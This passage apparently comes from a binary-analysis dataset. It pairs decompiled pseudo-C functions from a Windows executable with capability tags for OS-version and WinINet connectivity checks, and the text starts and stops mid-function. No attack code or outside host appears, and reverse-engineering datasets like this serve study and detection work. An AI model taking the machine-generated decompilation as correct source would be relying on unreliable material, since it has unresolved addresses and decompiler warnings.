    arg_8h);\n                        (**0x4690ac)(&fcn.004174d0::var_720h, 0x446e60, &fcn.004174d0::var_310h, *0x457d74);\n                        (**0x4690ac)(&fcn.004174d0::var_20ch, 0x4474e8, arg_10h, &fcn.004174d0::var_108h, *0x457e74, \n                                     arg_8h);\n                        (**0x4690ac)(&fcn.004174d0::var_518h, 0x446e60, &fcn.004174d0::var_20ch, *0x457d74);\n                        (**0x4690ac)(&fcn.004174d0::var_824h, 0x4474cc, arg_10h, &fcn.004174d0::var_108h);\n                        (**0x4690ac)(&fcn.004174d0::var_a2ch, 0x446e60, &fcn.004174d0::var_824h, *0x457d74);\n                        if (arg_20h != 0) {\n                            iVar2 = fcn.00420f90(&fcn.004174d0::var_61ch);\n                            if (iVar2 != 0) {\n                                unaff_EDI = arg_18h;\n                                fcn.00417130(&fcn.004174d0::var_414h, arg_ch, arg_14h, &fcn.004174d0::var_108h, arg_18h\n                                             , 1);\n                            }\n                        }\n                        if (arg_24h != 0) {\n                            iVar2 = fcn.00420f90(&fcn.004174d0::var_720h);\n                            if (iVar2 != 0) {\n                                fcn.00417130(&fcn.004174d0::var_310h, arg_ch, arg_14h, &fcn.004174d0::var_108h, arg_18h\n                                             , 2);\n                            }\n                        }\n                        if (arg_28h != 0) {\n                            iVar2 = fcn.00420f90(&fcn.004174d0::var_518h);\n                            if (iVar2 != 0) {\n                                fcn.00417130(&fcn.004174d0::var_20ch, arg_ch, arg_14h, &fcn.004174d0::var_108h, arg_18h\n                                             , 3);\n                                fcn.00417130(&fcn.004174d0::var_824h, arg_ch, arg_14h, &fcn.004174d0::var_108h, arg_18h\n                                             , 4);\n                            }\n                        }\n                        fcn.0042acb0(&fcn.004174d0::var_414h, 0, 0x104);\n                        fcn.0042acb0(&fcn.004174d0::var_61ch, 0, 0x104);\n                        fcn.0042acb0(&fcn.004174d0::var_310h, 0, 0x104);\n                        fcn.0042acb0(&fcn.004174d0::var_720h, 0, 0x104);\n                        fcn.0042acb0(&fcn.004174d0::var_20ch, 0, 0x104);\n                        fcn.0042acb0(&fcn.004174d0::var_518h, 0, 0x104);\n                    }\n                }\n                iVar2 = (**0x469170)(iVar1, &fcn.004174d0::var_b6dh + 1);\n            } while (iVar2 != 0);\n            (**0x4690e0)(iVar1);\n            fcn.0042ad2a(unaff_EDI);\n            return;\n        }\n        goto code_r0x00417aad;\n    }\n    fcn.0042acb0(&fcn.004174d0::var_108h, 0, 0x104);\n    if (arg_1ch == 1) {\n        uVar3 = 0x447498;\ncode_r0x004178a0:\n        (**0x469258)(&fcn.004174d0::var_108h, uVar3);\n    }\n    else {\n        if (arg_1ch == 2) {\n            uVar3 = 0x4474a8;\n            goto code_r0x004178a0;\n        }\n        if (arg_1ch == 3) {\n            uVar3 = 0x4474b8;\n            goto code_r0x004178a0;\n        }\n    }\n    (**0x4690ac)(&fcn.004174d0::var_20ch, 0x447284, arg_10h, &fcn.004174d0::var_108h, *0x458364, arg_8h);\n    (**0x4690ac)(&fcn.004174d0::var_518h, 0x446e60, &fcn.004174d0::var_20ch, *0x457d74);\n    (**0x4690ac)(&fcn.004174d0::var_310h, 0x447284, arg_10h, &fcn.004174d0::var_108h, *0x4581c4, arg_8h);\n    (**0x4690ac)(&fcn.004174d0::var_720h, 0x446e60, &fcn.004174d0::var_310h, *0x457d74);\n    (**0x4690ac)(&fcn.004174d0::var_414h, 0x4474e8, arg_10h, &fcn.004174d0::var_108h, *0x457e74, arg_8h);\n    (**0x4690ac)(&fcn.004174d0::var_61ch, 0x446e60, &fcn.004174d0::var_414h, *0x457d74);\n    if (arg_20h != 0) {\n        var_b78h = 0x417987;\n        iVar1 = fcn.00420f90(&fcn.004174d0::var_518h);\n        if (iVar1 != 0) {\n            var_b78h = arg_8h;\n            unaff_ESI = &fcn.004174d0::var_108h;\n            fcn.00417130(&fcn.004174d0::var_20ch, 0x417987, arg_14h, unaff_ESI, arg_18h, 1);\n        }\n    }\n    if (arg_24h != 0) {\n        iVar1 = fcn.00420f90(&fcn.004174d0::var_720h);\n        if (iVar1 != 0) {\n            fcn.00417130(&fcn.004174d0::var_310h, var_b78h, arg_14h, &fcn.004174d0::var_108h, arg_18h, 2);\n        }\n    }\n    if (arg_28h != 0) {\n        iVar1 = fcn.00420f90(&fcn.004174d0::var_61ch);\n        if (iVar1 != 0) {\n            fcn.00417130(&fcn.004174d0::var_414h, var_b78h, arg_14h, &fcn.004174d0::var_108h, arg_18h, 3);\n        }\n    }\n    fcn.0042acb0(&fcn.004174d0::var_20ch, 0, 0x104);\n    fcn.0042acb0(&fcn.004174d0::var_518h, 0, 0x104);\n    fcn.0042acb0(&fcn.004174d0::var_310h, 0, 0x104);\n    fcn.0042acb0(&fcn.004174d0::var_720h, 0, 0x104);\n    fcn.0042acb0(&fcn.004174d0::var_414h, 0, 0x104);\n    fcn.0042acb0(&fcn.004174d0::var_61ch, 0, 0x104);\ncode_r0x00417aad:\n    fcn.0042ad2a(unaff_ESI);\n    return;\n}\n",
        "token_count": 2572
    },
    "00418390": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00418390(uint *arg_8h)\n\n{\n    uint unaff_EBP;\n    uint var_138ch;\n    uint uStackY68;\n    uint *puStackY64;\n    uint uStackY60;\n    uint *puStackY56;\n    uint uStackY52;\n    uint *puStackY48;\n    uint *puStackY44;\n    uint *puStackY40;\n    uint *puStackY36;\n    uint *puStackY32;\n    uint *puStackY28;\n    uint *puStackY24;\n    uint uStackY20;\n    uint *puStackY16;\n    uint uStackY12;\n    uint var_4h;\n    \n    var_4h = 0x41839d;\n    fcn.0042ae40();\n    if (arg_8h != NULL) {\n        uStackY12 = 0xffff;\n        puStackY16 = 0x458800;\n        uStackY20 = 0x447900;\n        puStackY24 = 0x4183c8;\n        (**0x469128)();\n        puStackY24 = 0x1388;\n        puStackY32 = &fcn.00418390::var_138ch;\n        puStackY28 = NULL;\n        puStackY36 = 0x4183db;\n        fcn.0042acb0();\n        puStackY24 = 0x458800;\n        puStackY28 = &fcn.00418390::var_138ch;\n        puStackY32 = 0x4183f0;\n        (**0x469258)();\n        puStackY32 = 0x447134;\n        puStackY36 = &fcn.00418390::var_138ch;\n        puStackY40 = 0x418402;\n        (**0x469258)();\n        puStackY40 = arg_8h;\n        puStackY44 = &fcn.00418390::var_138ch;\n        puStackY48 = 0x418410;\n        (**0x469258)();\n        puStackY48 = &fcn.00418390::var_138ch;\n        uStackY52 = 0x447900;\n        puStackY56 = 0x418422;\n        (**0x4690e4)();\n        puStackY56 = 0x1388;\n        puStackY64 = &fcn.00418390::var_138ch;\n        uStackY60 = 0;\n        uStackY68 = 0x418435;\n        fcn.0042acb0();\n        puStackY56 = *0x458470;\n        uStackY60 = 0x418444;\n        *0x4587ac = (**0x46924c)();\n        if (*0x4587ac != NULL) {\n            uStackY12 = *0x457ff4;\n            uStackY20 = 0x41845f;\n            puStackY16 = *0x4587ac;\n            *0x4587a0 = (**0x4691ac)();\n            uStackY20 = *0x4583d4;\n            puStackY24 = *0x4587ac;\n            puStackY28 = 0x418477;\n            *0x4587c0 = (**0x4691ac)();\n            puStackY28 = *0x457ef0;\n            puStackY32 = *0x4587ac;\n            puStackY36 = 0x418490;\n            *0x458768 = (**0x4691ac)();\n            puStackY36 = *0x457e24;\n            puStackY40 = *0x4587ac;\n            puStackY44 = 0x4184a8;\n            *0x458790 = (**0x4691ac)();\n            puStackY44 = *0x458588;\n            puStackY48 = *0x4587ac;\n            uStackY52 = 0x4184c0;\n            *0x4587b0 = (**0x4691ac)();\n            uStackY52 = *0x45809c;\n            puStackY56 = *0x4587ac;\n            uStackY60 = 0x4184d9;\n            *0x458788 = (**0x4691ac)();\n        }\n        if ((((*0x4587a0 != 0) && (*0x4587c0 != 0)) && (*0x458768 != 0)) &&\n           (((*0x4587b0 != 0 && (*0x458788 != 0)) && (*0x458790 != 0)))) {\n            var_4h = 0x418524;\n            fcn.0042ad2a(unaff_EBP);\n            return;\n        }\n    }\n    var_4h = 0x418535;\n    fcn.0042ad2a(unaff_EBP);\n    return;\n}\n",
        "token_count": 1089
    },
    "00418820": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418820(int32_t param_1)\n\n{\n    if (**(param_1 + 0x20) != 0) {\n        return;\n    }\n    return;\n}\n",
        "token_count": 45
    },
    "00418a20": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418a20(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    uint32_t extraout_ECX;\n    uint32_t extraout_ECX_00;\n    uint var_14h;\n    uint var_8h;\n    uint var_4h;\n    \n    *(in_ECX + 0xc) = arg_8h & 0x17;\n    uVar2 = *(in_ECX + 0x10) & arg_8h & 0x17;\n    if (uVar2 != 0) {\n        if (arg_ch != '\\0') {\n            fcn.0042ba31(0, 0);\n            uVar2 = extraout_ECX;\n        }\n        if ((uVar2 & 4) != 0) {\n            var_4h = fcn.0042a7f3();\n            arg_ch = 0x4479a8;\n            fcn.0042b329(&arg_ch);\n            var_8h = 1;\n            var_14h = 0x447970;\n            fcn.0042ba31(&var_14h, 0x44d464);\n            uVar2 = extraout_ECX_00;\n        }\n        if ((uVar2 & 2) != 0) {\n            uVar1 = fcn.0042a7f3();\n            arg_ch = 0x447990;\n            fcn.0042b329(&arg_ch);\n            var_8h = 1;\n            var_14h = 0x447970;\n            var_4h = uVar1;\n            fcn.0042ba31(&var_14h, 0x44d464);\n        }\n        uVar1 = fcn.0042a7f3();\n        arg_ch = 0x447978;\n        fcn.0042b329(&arg_ch);\n        var_8h = 1;\n        var_14h = 0x447970;\n        var_4h = uVar1;\n        fcn.0042ba31(&var_14h, 0x44d464);\n    }\n    return;\n}\n",
        "token_count": 494
    },
    "00418d30": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418d30(int32_t param_1)\n\n{\n    if (**(param_1 + 0x24) != 0) {\n        return;\n    }\n    return;\n}\n",
        "token_count": 46
    },
    "00418d80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00418db8)\n// WARNING: Removing unreachable block (ram,0x00418dc5)\n\nint64_t __cdecl fcn.00418d80(uchar *arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    uint32_t arg_10h_00;\n    bool bVar3;\n    int64_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((-1 < arg_10h) && ((iVar1 = 0,  0 < arg_10h || (iVar1 = 0,  arg_ch != 0)))) {\n        while( true ) {\n            do {\n                iVar4 = fcn.00418820();\n                if (iVar4 < 1) {\n                    iVar2 = (**(*in_ECX + 0x1c))();\n                    if (iVar2 == -1) {\n                        return iVar1;\n                    }\n                    *arg_8h = iVar2;\n                    iVar1 = iVar1 + 1;\n                    bVar3 = arg_ch != 0;\n                    arg_ch = arg_ch - 1;\n                    arg_10h = arg_10h + -1 + bVar3;\n                    arg_8h = arg_8h + 1;\n                }\n                else {\n                    if (CONCAT44(arg_10h, arg_ch) < iVar4) {\n                        iVar4 = CONCAT44(arg_10h, arg_ch);\n                    }\n                    arg_10h_00 = iVar4;\n                    fcn.0042af40(arg_8h, *in_ECX[8], arg_10h_00);\n                    iVar1 = iVar4 + iVar1;\n                    bVar3 = arg_ch < arg_10h_00;\n                    arg_ch = arg_ch - arg_10h_00;\n                    arg_10h = (arg_10h - (iVar4 >> 0x20)) - bVar3;\n                    *in_ECX[0xc] = *in_ECX[0xc] - arg_10h_00;\n                    *in_ECX[8] = *in_ECX[8] + arg_10h_00;\n                    arg_8h = arg_8h + arg_10h_00;\n                }\n            } while (0 < arg_10h);\n            if (arg_10h < 0) break;\n            if (arg_ch == 0) {\n                return iVar1;\n            }\n        }\n        return iVar1;\n    }\n    return 0;\n}\n",
        "token_count": 579
    },
    "00418e50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00418e88)\n// WARNING: Removing unreachable block (ram,0x00418e95)\n\nint64_t __cdecl fcn.00418e50(uchar *arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    uint32_t arg_10h_00;\n    bool bVar3;\n    int64_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((-1 < arg_10h) && ((iVar1 = 0,  0 < arg_10h || (iVar1 = 0,  arg_ch != 0)))) {\n        while( true ) {\n            do {\n                iVar4 = fcn.00418d30();\n                if (iVar4 < 1) {\n                    iVar2 = (**(*in_ECX + 0xc))(*arg_8h);\n                    if (iVar2 == -1) {\n                        return iVar1;\n                    }\n                    arg_8h = arg_8h + 1;\n                    iVar1 = iVar1 + 1;\n                    bVar3 = arg_ch != 0;\n                    arg_ch = arg_ch - 1;\n                    arg_10h = arg_10h + -1 + bVar3;\n                }\n                else {\n                    if (CONCAT44(arg_10h, arg_ch) < iVar4) {\n                        iVar4 = CONCAT44(arg_10h, arg_ch);\n                    }\n                    arg_10h_00 = iVar4;\n                    fcn.0042af40(*in_ECX[9], arg_8h, arg_10h_00);\n                    arg_8h = arg_8h + arg_10h_00;\n                    iVar1 = iVar4 + iVar1;\n                    bVar3 = arg_ch < arg_10h_00;\n                    arg_ch = arg_ch - arg_10h_00;\n                    arg_10h = (arg_10h - (iVar4 >> 0x20)) - bVar3;\n                    *in_ECX[0xd] = *in_ECX[0xd] - arg_10h_00;\n                    *in_ECX[9] = *in_ECX[9] + arg_10h_00;\n                }\n            } while (0 < arg_10h);\n            if (arg_10h < 0) break;\n            if (arg_ch == 0) {\n                return iVar1;\n            }\n        }\n        return iVar1;\n    }\n    return 0;\n}\n",
        "token_count": 573
    },
    "00419380": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00419380(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    uint8_t *puVar2;\n    uint32_t uVar3;\n    \n    if (*param_1[8] != 0) {\n        if (1 < *param_1[0xc]) {\n            *param_1[0xc] = *param_1[0xc] + -1;\n            puVar2 = *param_1[8] + 1;\n            *param_1[8] = puVar2;\n            return *puVar2;\n        }\n        if ((*param_1[8] != 0) && (piVar1 = param_1[0xc],  0 < *piVar1)) {\n            *piVar1 = *piVar1 + -1;\n            puVar2 = *param_1[8];\n            *param_1[8] = puVar2 + 1;\n            uVar3 = *puVar2;\n            goto code_r0x004193d0;\n        }\n    }\n    uVar3 = (**(*param_1 + 0x1c))();\ncode_r0x004193d0:\n    if (uVar3 == 0xffffffff) {\n        return 0xffffffff;\n    }\n    if ((*param_1[8] != NULL) && (0 < *param_1[0xc])) {\n        return **param_1[8];\n    }\n    // WARNING: Could not recover jumptable at 0x004193f8. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar3 = (**(*param_1 + 0x18))();\n    return uVar3;\n}\n",
        "token_count": 380
    },
    "00419400": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00419400(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t in_ECX;\n    \n    *(in_ECX + 0x10) = in_ECX + 8;\n    *(in_ECX + 0x20) = in_ECX + 0x18;\n    *(in_ECX + 0x24) = in_ECX + 0x1c;\n    *(in_ECX + 0x50) = arg_ch == 1;\n    *(in_ECX + 0x30) = in_ECX + 0x28;\n    *(in_ECX + 0x49) = 0;\n    *(in_ECX + 0x14) = in_ECX + 0xc;\n    *(in_ECX + 0x34) = in_ECX + 0x2c;\n    *(in_ECX + 0xc) = 0;\n    **(in_ECX + 0x24) = 0;\n    **(in_ECX + 0x34) = 0;\n    **(in_ECX + 0x10) = 0;\n    **(in_ECX + 0x20) = 0;\n    **(in_ECX + 0x30) = 0;\n    if (arg_8h != 0) {\n        *(in_ECX + 0x10) = arg_8h + 8;\n        *(in_ECX + 0x14) = arg_8h + 8;\n        *(in_ECX + 0x20) = arg_8h;\n        *(in_ECX + 0x24) = arg_8h;\n        *(in_ECX + 0x30) = arg_8h + 4;\n        *(in_ECX + 0x34) = arg_8h + 4;\n    }\n    *(in_ECX + 0x54) = arg_8h;\n    *(in_ECX + 0x4c) = *0x468800;\n    *(in_ECX + 0x44) = 0;\n    return;\n}\n",
        "token_count": 469
    },
    "00419590": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00419590(int32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t arg_8h_00;\n    int32_t *in_FS_OFFSET;\n    uint uVar4;\n    uint uVar5;\n    uint var_24h;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43f4d8;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar5 = 0;\n    fcn.0042a3db(0);\n    iVar3 = *0x468804;\n    var_4h = 0;\n    var_10h = *0x468804;\n    if (*0x469404 == 0) {\n        uVar4 = 0;\n        fcn.0042a3db(0);\n        if (*0x469404 == 0) {\n            *0x469400 = *0x469400 + 1;\n            *0x469404 = *0x469400;\n        }\n        fcn.0042a403(uVar4, uVar5, uVar1);\n    }\n    uVar1 = *0x469404;\n    iVar2 = *arg_8h;\n    if (*0x469404 < *(iVar2 + 0xc)) {\n        arg_8h_00 = *(*(iVar2 + 8) + *0x469404 * 4);\n        if (arg_8h_00 == 0) goto code_r0x00419620;\ncode_r0x0041963e:\n        if (arg_8h_00 != 0) goto code_r0x004196a7;\n    }\n    else {\n        arg_8h_00 = 0;\ncode_r0x00419620:\n        if (*(iVar2 + 0x14) == '\\0') goto code_r0x0041963e;\n        iVar2 = fcn.0042a4a6();\n        if (uVar1 < *(iVar2 + 0xc)) {\n            arg_8h_00 = *(*(iVar2 + 8) + uVar1 * 4);\n            goto code_r0x0041963e;\n        }\n    }\n    arg_8h_00 = iVar3;\n    if (iVar3 == 0) {\n        iVar3 = fcn.004192a0(&var_10h, arg_8h);\n        if (iVar3 == -1) {\n            fcn.0042b385(0x447a34);\n            fcn.0042ba31(&var_24h, 0x44d5e8);\n        }\n        arg_8h_00 = var_10h;\n        *0x468804 = var_10h;\n        fcn.0042a3db(0);\n        if (*(arg_8h_00 + 4) != -1) {\n            *(arg_8h_00 + 4) = *(arg_8h_00 + 4) + 1;\n        }\n        fcn.0042a403();\n        fcn.0042a42f(arg_8h_00);\n    }\ncode_r0x004196a7:\n    var_4h = 0xffffffff;\n    fcn.0042a403();\n    *in_FS_OFFSET = var_ch;\n    return arg_8h_00;\n}\n",
        "token_count": 823
    },
    "00419780": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00419780(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if ((*(*(*param_1 + 4) + 0xc + param_1) & 6) == 0) {\n        iVar1 = (**(**(*(*param_1 + 4) + 0x38 + param_1) + 0x34))();\n        if (iVar1 == -1) {\n            uVar2 = 4;\n        }\n    }\n    if (uVar2 != 0) {\n        uVar2 = *(param_1 + *(*param_1 + 4) + 0xc) | uVar2;\n        if (*(param_1 + *(*param_1 + 4) + 0x38) == 0) {\n            uVar2 = uVar2 | 4;\n        }\n        fcn.00418a20(uVar2, 0);\n    }\n    return param_1;\n}\n",
        "token_count": 233
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00419a70": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00419a70(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    \n    uVar1 = **(in_ECX + 0x20);\n    if (((uVar1 != 0) && (**(in_ECX + 0x10) < uVar1)) && ((arg_8h == 0xffffffff || (*(uVar1 - 1) == arg_8h)))) {\n        **(in_ECX + 0x30) = **(in_ECX + 0x30) + 1;\n        **(in_ECX + 0x20) = **(in_ECX + 0x20) + -1;\n        return -(arg_8h != 0xffffffff) & arg_8h;\n    }\n    if ((*(in_ECX + 0x54) != 0) && (arg_8h != 0xffffffff)) {\n        if ((*(in_ECX + 0x44) == 0) && (iVar2 = fcn.0042ded1(arg_8h & 0xff, *(in_ECX + 0x54)),  iVar2 != -1)) {\n            return arg_8h;\n        }\n        if (**(in_ECX + 0x20) != in_ECX + 0x48) {\n            *(in_ECX + 0x48) = arg_8h;\n            fcn.00419a30();\n            return arg_8h;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 353
    },
    "00419c10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00419c10(int32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t arg_8h_00;\n    int32_t *in_FS_OFFSET;\n    uint uVar4;\n    uint uVar5;\n    uint var_24h;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43f4d8;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar5 = 0;\n    fcn.0042a3db(0);\n    iVar3 = *0x468808;\n    var_4h = 0;\n    var_10h = *0x468808;\n    if (*0x46880c == 0) {\n        uVar4 = 0;\n        fcn.0042a3db(0);\n        if (*0x46880c == 0) {\n            *0x46880c = *0x469400 + 1;\n            *0x469400 = *0x46880c;\n        }\n        fcn.0042a403(uVar4, uVar5, uVar1);\n    }\n    uVar1 = *0x46880c;\n    iVar2 = *arg_8h;\n    if (*0x46880c < *(iVar2 + 0xc)) {\n        arg_8h_00 = *(*(iVar2 + 8) + *0x46880c * 4);\n        if (arg_8h_00 == 0) goto code_r0x00419ca0;\ncode_r0x00419cbe:\n        if (arg_8h_00 != 0) goto code_r0x00419d27;\n    }\n    else {\n        arg_8h_00 = 0;\ncode_r0x00419ca0:\n        if (*(iVar2 + 0x14) == '\\0') goto code_r0x00419cbe;\n        iVar2 = fcn.0042a4a6();\n        if (uVar1 < *(iVar2 + 0xc)) {\n            arg_8h_00 = *(*(iVar2 + 8) + uVar1 * 4);\n            goto code_r0x00419cbe;\n        }\n    }\n    arg_8h_00 = iVar3;\n    if (iVar3 == 0) {\n        iVar3 = fcn.004196d0(&var_10h, arg_8h);\n        if (iVar3 == -1) {\n            fcn.0042b385(0x447a34);\n            fcn.0042ba31(&var_24h, 0x44d5e8);\n        }\n        arg_8h_00 = var_10h;\n        *0x468808 = var_10h;\n        fcn.0042a3db(0);\n        if (*(arg_8h_00 + 4) != -1) {\n            *(arg_8h_00 + 4) = *(arg_8h_00 + 4) + 1;\n        }\n        fcn.0042a403();\n        fcn.0042a42f(arg_8h_00);\n    }\ncode_r0x00419d27:\n    var_4h = 0xffffffff;\n    fcn.0042a403();\n    *in_FS_OFFSET = var_ch;\n    return arg_8h_00;\n}\n",
        "token_count": 833
    },
    "00419d90": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00419d90(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t arg_8h_00;\n    uint arg_8h_01;\n    int32_t *piVar2;\n    int32_t in_ECX;\n    int32_t *in_FS_OFFSET;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43ead8;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    if (*(in_ECX + 0x54) == 0) {\n        arg_8h_00 = fcn.0042ab33(arg_8h, arg_ch, arg_10h);\n        if (arg_8h_00 != 0) {\n            fcn.00419400(arg_8h_00, 1);\n            arg_8h_01 = fcn.00418840(&arg_10h);\n            var_4h = 0;\n            piVar2 = fcn.00419c10(arg_8h_01);\n            cVar1 = (**(*piVar2 + 4))();\n            if (cVar1 != '\\0') {\n                *(in_ECX + 0x44) = 0;\n                fcn.00415680();\n                *in_FS_OFFSET = var_ch;\n                return in_ECX;\n            }\n            *(in_ECX + 0x44) = piVar2;\n            fcn.00419020();\n            fcn.00415680();\n            *in_FS_OFFSET = var_ch;\n            return in_ECX;\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    return 0;\n}\n",
        "token_count": 400
    },
    "0041a090": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_30h\n\nvoid __fastcall fcn.0041a090(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t var_30h;\n    uint *var_2ch;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43eb38;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    if (((param_1[0x11] != 0) && (*(param_1 + 0x49) != '\\0')) &&\n       (iVar1 = (**(*param_1 + 0xc))(0xffffffff, var_10h),  iVar1 != -1)) {\n        var_18h = 0xf;\n        var_1ch = 0;\n        var_2ch = var_2ch & 0xffffff00;\n        fcn.0042acb0(&var_2ch, 0, 8);\n        var_1ch = 8;\n        puVar2 = var_2ch;\n        if (var_18h < 0x10) {\n            puVar2 = &var_2ch;\n        }\n        *(puVar2 + 2) = 0;\n        var_4h = 0;\n        while( true ) {\n            puVar2 = var_2ch;\n            if (var_18h < 0x10) {\n                puVar2 = &var_2ch;\n            }\n            iVar1 = (**(*param_1[0x11] + 0x18))(param_1 + 0x13, puVar2, puVar2 + var_1ch, &var_30h);\n            if (iVar1 != 0) break;\n            *(param_1 + 0x49) = 0;\ncode_r0x0041a157:\n            puVar2 = 